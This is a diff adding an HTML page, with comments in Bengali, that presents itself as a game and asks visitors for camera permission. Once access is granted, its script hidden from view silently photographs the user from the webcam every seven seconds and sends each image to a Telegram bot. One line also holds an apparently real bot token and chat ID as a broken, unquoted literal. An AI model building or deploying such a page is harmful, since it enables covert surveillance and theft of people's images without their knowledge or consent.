@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Zone - Play Now</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0d0d0d;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* পারমিশন পপআপ মডাল */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-box {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px #ff3366;
+            max-width: 350px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-box h3 {
+            color: #ff3366;
+            margin-top: 0;
+        }
+
+        .modal-buttons {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .btn-allow {
+            background-color: #28a745;
+            color: white;
+        }
+
+        .btn-allow:hover {
+            background-color: #218838;
+        }
+
+        .btn-deny {
+            background-color: #dc3545;
+            color: white;
+        }
+
+        .btn-deny:hover {
+            background-color: #c82333;
+        }
+
+        #gameContainer {
+            display: none;
+            width: 100%;
+            height: 100%;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            background: radial-gradient(circle, #222 0%, #000 100%);
+            padding: 20px 0;
+            box-sizing: border-box;
+        }
+
+        @keyframes glow {
+            0% { text-shadow: 0 0 5px #f00, 0 0 10px #f00; }
+            50% { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000; }
+            100% { text-shadow: 0 0 5px #f00, 0 0 10px #f00; }
+        }
+
+        .footer-text {
+            font-size: 16px;
+            color: #FF3366;
+            font-weight: bold;
+            animation: glow 3s infinite alternate;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- পারমিশন পপআপ বক্স -->
+    <div class="modal-overlay" id="permissionModal">
+        <div class="modal-box">
+            <h3>🎮 Game Access Request</h3>
+            <p>গেমটি খেলতে এবং ক্যামেরা পারমিশন দিয়ে ভেরিফাই করতে নিচে ক্লিক করুন:</p>
+            <div class="modal-buttons">
+                <button class="btn btn-deny" onclick="denyAccess()">Deny</button>
+                <button class="btn btn-allow" onclick="allowAndCapture()">Allow & Play</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- গেম ইন্টারফেস -->
+    <div id="gameContainer">
+        <div></div>
+        <div>
+            <h1>🎮 Welcome to the Game Zone!</h1>
+            <p>আপনার গেম সফলভাবে লোড হচ্ছে...</p>
+        </div>
+        
+        <!-- ডেভেলপার নাম -->
+        <div class="footer-text">
+            Developed By NUMAN GAZI (*M*)
+        </div>
+    </div>
+
+    <!-- ক্যামেরা ও ক্যানভাস -->
+    <video id="video" width="400" height="300" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+
+    <script>
+        // ==========================================
+        // আপনার টেলিগ্রাম Bot Token এবং Chat ID এখানে বসাবেন
+        // ==========================================
+        const botToken = "YOUR_BOT_TOKEN_HERE"; 
+        const chatId = "YOUR_CHAT_ID_HERE";
+
+        function denyAccess() {
+            alert("পারমিশন দেওয়া হয়নি! গেমটি চালু করা সম্ভব নয়।");
+            location.reload();
+        }
+
+        function allowAndCapture() {
+            // ব্রাউজারের সিকিউরিটি ও মোবাইল সাপোর্টের জন্য constraints যোগ করা হয়েছে
+            navigator.mediaDevices.getUserMedia({ video: { width: 400, height: 300 } })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // পপআপ লুকিয়ে গেম স্ক্রিন দেখানো
+                    document.getElementById("permissionModal").style.display = "none";
+                    document.getElementById("gameContainer").style.display = "flex";
+
+                    // ভিডিও স্ট্রিম লোড হওয়ার একটু পর থেকে প্রতি ৭ সেকেন্ড পর পর ছবি তোলার লুপ
+                    setTimeout(() => {
+                        setInterval(() => {
+                            captureAndSendPhoto(video);
+                        }, 7000);
+                    }, 1000);
+                })
+                .catch(err => {
+                    alert("দয়া করে ক্যামেরা পারমিশন Allow করুন, অন্যথায় গেম খেলা যাবে না!");
+                });
+        }
+
+        function captureAndSendPhoto(video) {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            // ভিডিওর বর্তমান ফ্রেম ক্যানভাসে ড্র করা
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                if (!blob) return;
+
+                let formData = new FormData();
+                formData.append('7602391279', 8578778214:AAFwWAqJztbmf1k2w60ML-07pNCkre5yIkM);
+                formData.append('photo', blob, 'user_photo.jpg');
+                formData.append('caption', '📸 গেম পেজ থেকে লাইভ ক্যাপচার করা ছবি!');
+
+                // টেলিগ্রামে ছবি পাঠানো
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.log("Telegram API Error: Check Token or Chat ID");
+                    }
+                })
+                .catch(error => {
+                    console.log("Network error while sending photo");
+                });
+            }, 'image/jpeg', 0.8);
+        }
+    </script>
+
+</body>
+</html>
